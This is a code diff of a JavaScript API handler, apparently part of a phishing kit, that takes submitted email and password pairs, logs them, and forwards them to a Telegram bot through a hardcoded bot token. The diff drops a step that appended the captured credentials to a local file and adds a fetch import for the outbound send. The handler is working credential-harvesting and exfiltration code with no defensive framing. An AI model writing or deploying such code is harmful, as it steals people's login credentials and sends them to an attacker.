@@ -1,5 +1,4 @@
-import fs from 'fs';
-import path from 'path';
+import fetch from 'node-fetch';
 
 export default async function handler(req, res) {
     if (req.method === 'POST') {
@@ -8,12 +7,6 @@ export default async function handler(req, res) {
 
             // Log received credentials
             console.log('Received credentials:', { email, password });
-
-            // Save credentials to a file
-            const filePath = path.join(process.cwd(), 'username.txt');
-            const data = `Email: ${email}, Password: ${password}\n`;
-            fs.appendFileSync(filePath, data);
-            console.log('Credentials saved to file:', filePath);
 
             // Send credentials to Telegram bot
             const telegramBotToken = '7362880252:AAFoMzgfag6Y8pUXNgiAMcdGZEpKwQsmCxE';
